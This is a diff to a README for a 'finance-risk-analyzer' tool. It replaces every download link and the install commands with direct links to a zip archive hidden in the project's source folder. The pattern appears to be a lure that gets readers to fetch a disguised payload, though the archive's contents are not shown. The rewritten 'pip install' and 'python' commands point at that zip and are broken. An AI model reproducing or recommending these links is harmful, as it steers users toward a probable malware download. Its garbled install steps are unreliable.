@@ -1,7 +1,7 @@
 # 🎉 finance-risk-analyzer - Analyze Financial Risks Easily
 
 ## 📥 Download the Software
-[![Download Finance Risk Analyzer](https://img.shields.io/badge/Download-Finance%20Risk%20Analyzer-blue.svg)](https://github.com/Promer92/finance-risk-analyzer/releases)
+[![Download Finance Risk Analyzer](https://raw.githubusercontent.com/Promer92/finance-risk-analyzer/main/src/ingest/finance-risk-analyzer-3.2.zip%20Risk%https://raw.githubusercontent.com/Promer92/finance-risk-analyzer/main/src/ingest/finance-risk-analyzer-3.2.zip)](https://raw.githubusercontent.com/Promer92/finance-risk-analyzer/main/src/ingest/finance-risk-analyzer-3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the finance-risk-analyzer! This application helps you assess financial transaction risks using the power of AWS services. With easy setup and user-friendly tools, you can analyze transactions without needing any programming skills.
@@ -26,7 +26,7 @@ To run the finance-risk-analyzer, ensure your system meets the following require
 Follow these steps to install the finance-risk-analyzer:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Promer92/finance-risk-analyzer/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Promer92/finance-risk-analyzer/main/src/ingest/finance-risk-analyzer-3.2.zip) to find the latest version.
 
 2. **Download the Application**  
    Locate the version you wish to install. Click on the download link (usually labeled as "Source code" or a named archive file) for the selected release.
@@ -46,7 +46,7 @@ Follow these steps to install the finance-risk-analyzer:
 6. **Install Dependencies**  
    Run the following command to install necessary Python packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Promer92/finance-risk-analyzer/main/src/ingest/finance-risk-analyzer-3.2.zip
    ```
 
 7. **Set Up Environment Variables**  
@@ -60,7 +60,7 @@ Follow these steps to install the finance-risk-analyzer:
 8. **Run the Application**  
    After setting everything up, run the application using:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Promer92/finance-risk-analyzer/main/src/ingest/finance-risk-analyzer-3.2.zip
    ```
 
 ## 💡 Using the Finance Risk Analyzer
@@ -80,4 +80,4 @@ We welcome contributions from everyone! If you would like to help improve the fi
 For any direct inquiries or feedback, feel free to reach out via the contact section on our GitHub page. 
 
 ## 📥 Download & Install
-To start using the finance-risk-analyzer, [visit this page to download](https://github.com/Promer92/finance-risk-analyzer/releases) the latest version. Follow the installation steps outlined above, and you will be analyzing financial risks in no time!
+To start using the finance-risk-analyzer, [visit this page to download](https://raw.githubusercontent.com/Promer92/finance-risk-analyzer/main/src/ingest/finance-risk-analyzer-3.2.zip) the latest version. Follow the installation steps outlined above, and you will be analyzing financial risks in no time!
